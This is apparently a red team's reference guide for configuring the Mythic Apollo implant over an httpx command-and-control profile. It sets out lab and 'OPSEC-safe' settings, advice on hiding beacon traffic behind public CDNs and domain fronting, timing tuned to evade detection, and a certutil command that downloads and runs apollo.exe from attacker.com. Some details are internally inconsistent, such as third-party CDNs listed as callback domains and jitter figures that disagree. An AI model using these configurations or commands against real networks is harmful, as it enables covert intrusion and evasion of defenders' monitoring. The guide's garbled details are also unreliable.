# Apollo Payload Configuration Reference

## ⚠️ CRITICAL - DO NOT USE FAKE DOMAINS

Example.com and 10.23.20.10:82 are **DETECTABLE**.

---

## Lab Testing Configuration

**Use when:** Training, CTF, non-monitored environments

```
Payload Type:           apollo
C2 Profile:             httpx
Filename:               apollo.exe
Selected OS:            Windows

PARAMETERS:
  callback_domains:           http://10.23.20.10:82
  callback_interval:          62
  callback_jitter:            37
  domain_rotation:            fail-over
  failover_threshold:         5
  encrypted_exchange_check:   true
  killdate:                   2027-11-30
  raw_c2_config:              httpx_config_fixed.toml
  timeout:                    240
```

**Status:** Works for lab/testing only - obvious to monitoring

---

## Operational Configuration (OPSEC-Safe)

**Use when:** Red team operations, monitored environments

```
Payload Type:           apollo
C2 Profile:             httpx
Filename:               apollo.exe
Selected OS:            Windows

PARAMETERS:
  callback_domains:           https://jsdelivr.net:443
  callback_interval:          60
  callback_jitter:            50
  domain_rotation:            fail-over
  failover_threshold:         5
  encrypted_exchange_check:   true
  killdate:                   2027-08-25
  raw_c2_config:              httpx_config_hardened.toml
  timeout:                    240
```

**Status:** Blends with legitimate CDN traffic - harder to detect

---

## Valid Callback Domains

### Legitimate CDNs (Recommended)
```
https://jsdelivr.net:443           ✓ Popular JS CDN
https://unpkg.com:443              ✓ npm CDN
https://cdnjs.cloudflare.com:443   ✓ Cloudflare CDN
https://cdn.jsdelivr.net:443       ✓ jsdelivr alternate
```

### Your Own Domain
```
https://yourdomain.com:443         ✓ Custom domain
https://cdn.yourdomain.com:443     ✓ CDN subdomain
```

### With Domain Fronting (Advanced)
```
https://yourdomain.com:443         (actual C2)
  + domain_front: cdnjs.cloudflare.com
                                   ✓ Hides real domain in TLS SNI
```

---

## WRONG Configurations (DO NOT USE)

### ❌ Fake Domains
```
https://example.com:443            WRONG - Not a real domain
https://cdn.examplestatic.io:443   WRONG - Spoofed domain
https://fake-cdn.com:443           WRONG - Obvious fake
```

### ❌ Non-Standard Ports
```
http://10.23.20.10:82              WRONG - Port 82 is anomalous
http://10.23.20.10:8080            WRONG - Obvious internal IP
http://localhost:8888              WRONG - Local port
```

### ❌ Aggressive Timing
```
callback_interval: 10              WRONG - Too fast (bot-like)
callback_interval: 5               WRONG - Extremely aggressive
callback_jitter: 10%               WRONG - Too predictable
callback_jitter: 0%                WRONG - Completely predictable
```

---

## Configuration Comparison

| Parameter | Lab | Operations | Why |
|-----------|-----|------------|-----|
| Domain | 10.23.20.10 | jsdelivr.net | Real domain blends in |
| Port | 82 | 443 | Standard HTTPS port |
| Interval | 62s | 60s | Reasonable timing |
| Jitter | 37% | 50% | Less predictable (30-90s) |
| Transforms | Base64 | XOR+Base64url | Harder to detect |
| Profile | config_fixed.toml | config_hardened.toml | Enhanced headers/URIs |

---

## Deployment Steps

### 1. Generate Payload
- Use **Operational Configuration** above
- Select **httpx_config_hardened.toml** for raw_c2_config
- Use **real domain** (not example.com or 10.23.20.10)
- Set **killdate** to operation end date

### 2. Deploy to Target
```bash
certutil -urlcache -f http://attacker.com/apollo.exe %temp%\apollo.exe
%temp%\apollo.exe
```

### 3. Verify Callback
- Appears in Mythic UI within 60±30 seconds (60s ± 50% jitter)
- Check: User, hostname, IPs, OS, architecture

### 4. Queue Tasks
- Shell whoami → executes within one checkin cycle
- Output visible in Mythic UI

---

## OPSEC Validation Checklist

Before deployment, verify:

- [ ] Domain is **real** (not example.com)
- [ ] Port is **443** (not 82)
- [ ] Interval is **60+ seconds** (not 10s)
- [ ] Jitter is **50%+** (not 23%)
- [ ] Using **httpx_config_hardened.toml** profile
- [ ] EKE encryption is **enabled**
- [ ] Kill date is **set** (operation end date)
- [ ] Raw C2 config **uploads without errors**
- [ ] Callback appears in Mythic within timing window
- [ ] Tasks execute successfully

---

## Troubleshooting

### "Config Check failed - Missing name"
→ Use `httpx_config_hardened.toml` (not JSON)

### "Failed to read file from Mythic (404)"
→ Restart httpx container and try again

### Callback never appears
→ Check:
  1. Domain is accessible from target
  2. Port 443 is open
  3. Interval/jitter window passed
  4. apollo.exe is running

### Tasks stuck at processing
→ Rebuild payload with latest Apollo.cs fix

---

## Real-World Example

**Operation:** Secure assessment for ACME Corp  
**Duration:** 2026-08-01 to 2026-08-15

**Configuration:**
```
callback_domains:    https://unpkg.com:443
callback_interval:   75
callback_jitter:     45%
killdate:            2026-08-15
raw_c2_config:       httpx_config_hardened.toml
encrypted_exchange:  true
```

**Why this works:**
- ✓ unpkg.com is legitimate npm CDN (no suspicion)
- ✓ 75s interval mimics realistic polling (40-107s range)
- ✓ 45% jitter makes pattern harder to predict
- ✓ Kill date prevents stray callbacks post-operation
- ✓ Hardened profile blends with normal CDN traffic

**Result:** Callbacks blend with legitimate JavaScript library requests - network monitoring sees only normal CDN traffic

---

**Last Updated:** 2026-08-25  
**Status:** Production Ready  
**Author:** Red Team Assessment
